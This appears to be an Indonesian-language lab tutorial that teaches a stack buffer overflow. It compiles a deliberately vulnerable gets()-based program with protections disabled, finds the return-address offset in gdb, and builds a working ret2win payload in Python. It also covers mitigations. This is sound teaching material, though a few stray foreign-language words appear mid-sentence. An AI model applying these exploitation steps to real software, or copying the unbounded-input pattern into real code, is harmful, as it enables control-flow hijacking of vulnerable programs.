# PART 5.1 — Lab: Buffer Overflow

[English](note.md) · **Bahasa Indonesia**

[← README](../../README.id.md) · [Peta belajar](../../INDEX.id.md) · **Lab di Fase 5**

> [!NOTE]
> **Sumber:** [PART 5 Buffer Overflow di YouTube](https://www.youtube.com/watch?v=UVdciB72aEk)
> Lab ini bagian dari **Fase 5 — Analisis Dinamis**: kita memakai `gdb` untuk **melihat** stack
> ditimpa, lalu mengarahkan alur program. Induk: PART 5 — Analisis Dinamis.
> Kamus istilah: [bagian 9](#9-kamus-istilah).

**Prasyarat:** [PART 1](../../PART1/note.id.md) (stack frame, `RBP`/`RSP`, return address) dan
[PART 2](../../PART2/note.id.md) (membaca instruksi, endianness dari PART 0).

**Setelah lab ini kamu bisa:** menjelaskan kenapa input tanpa batas berbahaya, menghitung
offset return address dari disassembly, membuktikan kendali atas `RIP` di debugger, dan
mengarahkan program ke fungsi yang tidak pernah dipanggil (**ret2win**).

> [!WARNING]
> Target di lab ini (`vuln.c`) adalah program **buatan sendiri yang sengaja dibuat rentan**.
> Teknik ini hanya untuk pembelajaran dan pengujian pada program milikmu sendiri atau yang
> kamu punya izin tertulis untuk uji. Kerjakan di VM (disiplin PART 0).

## Daftar isi

- [PART 5.1 — Lab: Buffer Overflow](#part-51--lab-buffer-overflow)
  - [Daftar isi](#daftar-isi)
  - [1. Dari memahami ke mengendalikan](#1-dari-memahami-ke-mengendalikan)
  - [2. Target dan dua celahnya](#2-target-dan-dua-celahnya)
  - [3. Proteksi modern dan flag lab](#3-proteksi-modern-dan-flag-lab)
  - [4. Anatomi stack dan offset](#4-anatomi-stack-dan-offset)
  - [5. Praktik: ret2win](#5-praktik-ret2win)
    - [5.1 Siapkan](#51-siapkan)
    - [5.2 Lab 1 — Picu crash, dan lihat bedanya dengan proteksi aktif](#52-lab-1--picu-crash-dan-lihat-bedanya-dengan-proteksi-aktif)
    - [5.3 Lab 2 — Buktikan kamu mengendalikan RIP](#53-lab-2--buktikan-kamu-mengendalikan-rip)
    - [5.4 Lab 3 — Hitung offset yang pasti](#54-lab-3--hitung-offset-yang-pasti)
    - [5.5 Lab 4 — Arahkan ke `win()` (ret2win)](#55-lab-4--arahkan-ke-win-ret2win)
    - [5.6 Troubleshooting](#56-troubleshooting)
  - [6. Kenapa ini berbahaya dan mitigasinya](#6-kenapa-ini-berbahaya-dan-mitigasinya)
  - [7. Rekap](#7-rekap)
    - [Cek dirimu](#cek-dirimu)
  - [8. Cliffhanger: dari crash ke pola](#8-cliffhanger-dari-crash-ke-pola)
  - [9. Kamus istilah](#9-kamus-istilah)

---

## 1. Dari memahami ke mengendalikan

Sampai Fase 4 kita **membaca** program orang lain: string, instruksi, peta file, pseudo-C.
Lab ini adalah titik balik: dari membaca menjadi **mengarahkan**.

> [!IMPORTANT]
> Prinsipnya satu: kalau kamu tahu di mana program menyimpan data dan bagaimana ia mengambil
> keputusan, kamu bisa mengubah keduanya. Di PART 2 kita mengubah **keputusan** (patch `jne`).
> Di sini kita mengubah **tujuan lompatan** — alamat yang dituju CPU saat fungsi selesai.

Ingat dari PART 1: `RET` mengambil **return address** dari stack. Return address itu data biasa
yang bisa ditulis. Kalau input pengguna bisa menulis sampai ke sana, pengguna yang menentukan
ke mana CPU pergi.

## 2. Target dan dua celahnya

Buat `vuln.c`:

```c
#include <stdio.h>
#include <string.h>

void win(void) {
    puts("[win] ACCESS GRANTED");
}

int main(void) {
    char input[64];
    printf("Enter the vault password: ");
    gets(input);                       // celah 2: tanpa batas panjang
    printf("You typed: %s\n", input);
    return 0;
}
```

Dua hal yang membuat program ini bisa dikendalikan:

| # | Celah | Kenapa berbahaya |
| :---: | :--- | :--- |
| 1 | `win()` ada tapi **tidak pernah dipanggil** | ada kode "berhasil" yang tinggal dituju — target lompatan kita |
| 2 | `gets()` membaca input **tanpa batas** | buffer 64 byte bisa menerima ratusan byte; sisanya meluap ke stack |

> [!NOTE]
> `gets()` sudah dihapus dari standar C11 karena tidak bisa dipakai dengan aman. Sebagian
> toolchain modern menolak atau memperingatkannya. Kalau kompilasi gagal, ganti baris itu
> dengan `scanf("%s", input);` — sama-sama tanpa batas panjang, dan pelajaran labnya identik.

> [!TIP]
> Analogi PART 1 dipakai lagi: buffer = gelas 64 tetes. `gets()` menuang tanpa melihat ukuran
> gelas. Kelebihan air tidak hilang — ia menimpa **nampan di sebelahnya**, dan salah satu
> nampan itu berisi alamat tujuan CPU.

## 3. Proteksi modern dan flag lab

Program nyata punya pagar pengaman. Lab ini memakai target tanpa pagar supaya mekanismenya
terlihat jelas:

| Proteksi | Gunanya | Efek kalau aktif | Flag lab |
| :--- | :--- | :--- | :--- |
| **Stack canary** | nilai penjaga tepat sebelum return address; kalau berubah → program abort | `*** stack smashing detected ***` sebelum `RIP` terkendali | `-fno-stack-protector` |
| **PIE + ASLR** | alamat kode diacak tiap eksekusi | alamat `win()` berubah terus, payload tidak stabil | `-no-pie` |
| **NX** | stack tidak bisa dieksekusi | **tidak** menghalangi lab ini: kita melompat ke kode yang sudah ada, bukan menanam kode | tidak perlu diubah |
| **RELRO** | tabel GOT dibuat read-only | tidak relevan untuk ret2win | — |

```bash
gcc -g -O0 -fno-stack-protector -no-pie vuln.c -o vuln
```

> [!IMPORTANT]
> `-fno-stack-protector` dan `-no-pie` **hanya untuk lab**. Di software nyata, proteksi ini
> justru yang harus dinyalakan — lihat [bagian 6](#6-kenapa-ini-berbahaya-dan-mitigasinya).

> [!NOTE]
> `-O0` juga penting: pada optimasi tinggi, fungsi yang tidak dipanggil bisa dibuang compiler
> (PART 0 Latihan 7), dan `win()` bisa hilang dari binary.

## 4. Anatomi stack dan offset

Dari PART 1, frame `main` terlihat seperti ini (buffer 64 byte):

```text
        alamat tinggi
        +---------------------------+
        |   return address          |  ← [rbp+8]   ◀── target kita (8 byte)
        +---------------------------+
        |   saved rbp               |  ← [rbp]     (8 byte)
        +---------------------------+
        |   input[64]               |  ← [rbp-0x40] ◀── gets() mulai menulis di sini
        +---------------------------+
        alamat rendah
```

`gets()` menulis **dari alamat rendah ke tinggi**, jadi urutannya:

```text
64 byte buffer  +  8 byte saved rbp  =  72 byte padding  →  lalu 8 byte return address
```

> [!IMPORTANT]
> Angka 72 **bukan konstanta universal**. Ia bergantung pada ukuran buffer dan berapa banyak
> ruang yang dialokasikan compiler. Selalu verifikasi dari disassembly (Lab 3), jangan dihafal.

## 5. Praktik: ret2win

### 5.1 Siapkan

```bash
gcc -g -O0 -fno-stack-protector -no-pie vuln.c -o vuln
./vuln
```

```text
Enter the vault password: tebak
You typed: tebak
```

> [!NOTE]
> Blok `bash` = terminal, `gdb` = di dalam gdb (tanpa prompt, siap paste), `text` = output,
> `asm` = disassembly. Semua alamat di bawah adalah **contoh** — ambil dari mesinmu sendiri.

### 5.2 Lab 1 — Picu crash, dan lihat bedanya dengan proteksi aktif

**Tujuan:** melihat overflow terjadi, dan memahami kenapa proteksi mengubah gejalanya.

```bash
python3 -c "print('A'*100)" | ./vuln
```

```text
Enter the vault password: You typed: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Segmentation fault
```

Sekarang bandingkan dengan versi **berproteksi** (flag default):

```bash
gcc -g -O0 vuln.c -o vuln.protected
python3 -c "print('A'*100)" | ./vuln.protected
```

```text
*** stack smashing detected ***: terminated
Aborted
```

> [!IMPORTANT]
> **THE AHA:** Dua-duanya overflow, tapi gejalanya beda. `Segmentation fault` = program
> tersandung alamat rusak. `stack smashing detected` = **canary sadar ada yang menimpa stack**
> dan sengaja menghentikan program. Pesan crash adalah petunjuk diagnóstico, bukan cuma error.

### 5.3 Lab 2 — Buktikan kamu mengendalikan RIP

**Tujuan:** melihat sendiri bahwa input pengguna sampai ke penunjuk instruksi CPU.

```bash
gdb -q ./vuln
```

```gdb
set disassembly-flavor intel
run < <(python3 -c "print('A'*100)")
info registers rip rsp rbp
x/4gx $rsp-0x10
```

```text
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011d2 in main ()
rip            0x414141414141      0x414141414141
rsp            0x7fffffffe0a8      0x7fffffffe0a8
```

`0x41` adalah kode ASCII huruf `A`. Enam byte `41` di `RIP` = **input kita dipakai sebagai
alamat tujuan**.

> [!NOTE]
> Yang terlihat bisa berbeda: `RIP = 0x414141414141`, atau crash **tepat di instruksi `ret`**
> dengan `RIP` masih menunjuk `ret`. Penyebabnya: alamat 8 byte penuh `0x4141414141414141`
> bersifat *non-canonical* (di luar batas alamat yang sah di x86-64), sehingga CPU menolak
> sebelum sempat melompat. Dua-duanya membuktikan hal yang sama: return address tertimpa.

> [!IMPORTANT]
> **THE AHA:** Crash bukan kegagalan — crash adalah **bukti kendali**. Yang mengubah "crash"
> menjadi "eksploitasi" hanyalah mengganti `AAAA...` dengan alamat yang有意义.

### 5.4 Lab 3 — Hitung offset yang pasti

**Tujuan:** mendapatkan angka padding dari binary, bukan dari tebakan.

```bash
objdump -d -M intel vuln | sed -n '/<main>:/,/ret/p'
```

```asm
main:
    push   rbp
    mov    rbp,rsp
    sub    rsp,0x40                  ; 64 byte untuk buffer
    lea    rax,[rbp-0x40]            ; alamat buffer
    mov    rdi,rax
    call   401050 <gets@plt>
    ...
    leave
    ret
```

Buffer di `[rbp-0x40]` → jarak ke return address = `0x40 + 8` = **72 byte**.

Verifikasi langsung di debugger:

```gdb
break *main+0x2a
run
info registers rbp
p/x $rbp+8
x/gx $rbp+8
```

```text
rbp            0x7fffffffe090      0x7fffffffe090
$1 = 0x7fffffffe098
0x7fffffffe098: 0x00007ffff7e0a2c0
```

`[rbp+8]` berisi alamat kembali ke libc — itulah slot yang akan kita timpa.

> [!TIP]
> Cara cepat lain: pasang **watchpoint** pada slot itu (`watch *(long*)($rbp+8)`) lalu
> `continue`. gdb akan berhenti tepat saat input mulai menimpanya — teknik yang dibahas di
> [PART 5](../note.id.md).

> [!IMPORTANT]
> **THE AHA:** Offset eksploitasi bukan angka hafalan, tapi **hasil membaca stack frame**.
> Kalau compiler mengubah alokasi (`sub rsp,0x50`), offsetnya ikut berubah — dan kamu tahu
> cara menghitungnya ulang.

### 5.5 Lab 4 — Arahkan ke `win()` (ret2win)

**Tujuan:** membuat program mencetak `[win] ACCESS GRANTED` tanpa pernah memanggil `win()`.

Cari alamat `win`:

```bash
objdump -d -M intel vuln | grep -A2 '<win>:'
nm vuln | grep ' T win'
```

```text
0000000000401156 <win>:
  401156:	push   rbp
  401157:	mov    rbp,rsp
0000000000401156 T win
```

Susun payload: 72 byte padding + alamat `win` **dalam little-endian** (PART 0 Latihan 6):

```bash
python3 -c "import struct,sys; sys.stdout.buffer.write(b'A'*72 + struct.pack('<Q', 0x401156))" > payload.bin
xxd payload.bin | tail -2
./vuln < payload.bin
```

```text
00000040: 4141 4141 4141 4141 5611 4000 0000 0000  AAAAAAAAV.@.....
Enter the vault password: You typed: AAAAAAAA...
[win] ACCESS GRANTED
Segmentation fault
```

Perhatikan `5611 4000 ...` — itulah `0x401156` ditulis terbalik per byte, persis prinsip
little-endian yang kita lihat di PART 0.

> [!NOTE]
> - Payload ditulis ke **file**, bukan lewat argumen shell, karena alamatnya mengandung byte
>   `00`. `gets()` membaca sampai newline/EOF, jadi byte null aman di jalur ini.
> - Program boleh crash **setelah** mencetak `[win] ...`. Itu normal: setelah `win()` selesai,
>   stack sudah rusak sehingga `ret`-nya menuju alamat sampah. Tujuan lab sudah tercapai
>   sebelum crash itu.

> [!IMPORTANT]
> **THE AHA:** Kita tidak menanam kode apa pun. Kita hanya **menulis ulang satu alamat**, dan
> program menjalankan kode miliknya sendiri yang seharusnya tidak pernah jalan. Kelas
> serangan ini disebut **ret2win** (return-to-win), bentuk paling sederhana dari *code reuse*.

### 5.6 Troubleshooting

| Gejala | Penyebab | Perbaikan |
| :--- | :--- | :--- |
| `*** stack smashing detected ***` | canary aktif | kompilasi ulang dengan `-fno-stack-protector` |
| Alamat `win` berubah tiap run | PIE + ASLR aktif | tambahkan `-no-pie` |
| `win` tidak ada di `nm` | fungsi dibuang compiler | pakai `-O0`, jangan `static` |
| Crash di dalam `puts`/`printf` (`movaps`) | **stack alignment** tidak 16 byte | sisipkan satu alamat instruksi `ret` sebelum alamat `win` |
| Kompilasi menolak `gets` | sudah dihapus dari C11 | ganti `scanf("%s", input)` |
| Payload tidak sampai | offset salah | ulangi Lab 3, baca `sub rsp,N` di mesinmu |

Perbaikan alignment (kalau perlu):

```bash
objdump -d vuln | grep -m1 -E '\bret\b'
python3 -c "import struct,sys; p=lambda a: struct.pack('<Q',a); sys.stdout.buffer.write(b'A'*72 + p(0x40101a) + p(0x401156))" > payload.bin
./vuln < payload.bin
```

Satu `ret` tambahan menggeser `RSP` 8 byte sehingga masuk ke `win()` dengan alignment yang
benar. `0x40101a` adalah contoh alamat instruksi `ret` — ambil dari output perintah pertama.

## 6. Kenapa ini berbahaya dan mitigasinya

Buffer overflow adalah salah satu kelas celah paling berpengaruh dalam sejarah keamanan
internet; banyak worm besar memakainya. Yang membuat lab ini berhasil bukan "trik hacker",
tapi **dua keputusan pemrograman**: fungsi baca tanpa batas, dan proteksi yang dimatikan.

Sisi bertahan — perbaiki kode, bukan cuma menyalakan flag:

```c
if (fgets(input, sizeof input, stdin) == NULL) return 1;
input[strcspn(input, "\n")] = '\0';    // buang newline sisa fgets
```

| Lapisan | Contoh | Fungsi |
| :--- | :--- | :--- |
| **Kode** | `fgets(buf, sizeof buf, ...)`, `snprintf`, cek panjang | menghilangkan penyebabnya |
| **Compiler** | `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2` | mendeteksi penimpaan saat runtime |
| **Linker/OS** | PIE + ASLR, NX, RELRO | membuat alamat sulit ditebak & stack tak bisa dieksekusi |
| **Proses** | review kode, static analysis, fuzzing | menemukan pola `gets`/`strcpy` sebelum rilis |

> [!IMPORTANT]
> Urutan yang benar: **perbaiki kodenya dulu**, proteksi binary sebagai lapisan kedua. Canary
> dan ASLR menaikkan biaya serangan, tapi tidak menghapus bug-nya.

## 7. Rekap

| Konsep | Inti yang harus kamu ingat |
| :--- | :--- |
| Buffer overflow | menulis melewati batas buffer, menimpa data di sebelahnya |
| Return address | data di `[rbp+8]`; siapa yang mengendalikannya menentukan tujuan `RET` |
| Offset | ukuran buffer + 8 (saved rbp); **verifikasi dari disassembly** |
| Crash | bukti kendali, bukan kegagalan; pesan crash memberi diagnosis |
| Canary | penjaga stack; gejalanya `stack smashing detected`, bukan SIGSEGV |
| PIE/ASLR | mengacak alamat; lab butuh `-no-pie` agar stabil |
| NX | tidak menghalangi ret2win karena kita memakai kode yang sudah ada |
| ret2win | timpa return address dengan alamat fungsi target, little-endian |
| Alignment | crash di `movaps` → sisipkan satu `ret` sebelum alamat target |
| Mitigasi | batas input di kode + proteksi compiler/OS |

### Cek dirimu

- [ ] Kenapa `gets()` tidak bisa dipakai dengan aman, apa pun ukuran buffernya?
- [ ] Di mana return address berada relatif terhadap `RBP`, dan siapa yang menaruhnya di sana?
- [ ] Bagaimana kamu menghitung offset padding dari disassembly?
- [ ] Apa bedanya `Segmentation fault` dan `stack smashing detected`?
- [ ] Kenapa NX tidak menghentikan serangan ret2win?
- [ ] Kenapa alamat target harus ditulis little-endian?
- [ ] Apa perbaikan kode yang benar, bukan sekadar flag kompilasi?

## 8. Cliffhanger: dari crash ke pola

Kamu baru saja memakai pola stack frame untuk **menyerang**. Pola yang sama juga dipakai untuk
**membaca**: begitu kamu bisa mengenali bentuk `if`, loop, dan `switch` dalam assembly, kamu
bisa menemukan fungsi berbahaya seperti ini di binary asing tanpa punya source code-nya.

> [!IMPORTANT]
> Itulah **Fase 6 — Reversing Patterns**: mengenali bentuk kode buatan compiler, supaya
> analisis berhenti menjadi membaca baris dan mulai menjadi membaca **struktur**.

> [!NOTE]
> Pendalaman eksploitasi (shellcode, ROP, heap) masuk **Fase 9 — Specialization**, bukan
> Fase 6. Di repo ini lab berhenti pada ret2win: cukup untuk membuktikan konsep kendali alur
> tanpa masuk ke pengembangan payload.

## 9. Kamus istilah

| Istilah | Arti sederhana |
| :--- | :--- |
| Buffer | ruang memori berukuran tetap untuk menampung data |
| Buffer overflow | menulis melebihi kapasitas buffer sehingga menimpa data di sebelahnya |
| `gets()` | fungsi C pembaca input tanpa batas panjang; sudah dihapus dari C11 |
| `fgets()` | alternatif aman: membaca maksimal sebanyak ukuran buffer |
| Return address | alamat instruksi yang dituju CPU setelah fungsi selesai (`[rbp+8]`) |
| Saved RBP | nilai `RBP` pemanggil yang disimpan di stack (8 byte) |
| Offset | jarak dalam byte dari awal buffer ke target yang mau ditimpa |
| Padding | byte pengisi payload sampai mencapai target |
| Payload | data yang dirancang untuk memicu perilaku tertentu |
| Overwrite | menimpa nilai asli di memori |
| Segmentation fault | crash saat program mengakses alamat memori tidak sah |
| Non-canonical address | alamat di luar batas sah x86-64; ditolak CPU sebelum melompat |
| RIP | Instruction Pointer: alamat instruksi berikutnya |
| Stack canary | nilai penjaga sebelum return address; berubah → program abort |
| Stack smashing detected | pesan saat canary mendeteksi penimpaan stack |
| PIE / ASLR | alamat kode diacak agar sulit ditebak |
| NX | stack tidak bisa dieksekusi |
| RELRO | tabel GOT dibuat read-only |
| ret2win | menimpa return address dengan alamat fungsi target yang sudah ada |
| Code reuse | memakai kode milik program sendiri, bukan menanam kode baru |
| Stack alignment | aturan stack berkelipatan 16 byte; kalau salah bisa crash di `movaps` |
| Watchpoint | breakpoint yang berhenti saat **nilai memori berubah** |
| Mitigasi | langkah mengurangi risiko: perbaikan kode + proteksi |

---

[← PART 5](../note.id.md) · [Peta belajar](../../INDEX.id.md) · **Selanjutnya:** PART 6 —
Pola Reversing ([catatan](../../PART6/note.id.md) · EN segera)

<div align="center">

[@T4n-Labs](https://t4nlabs.web.id/) • [@Gh0sT4n](https://gh0st4n.my.id)

</div>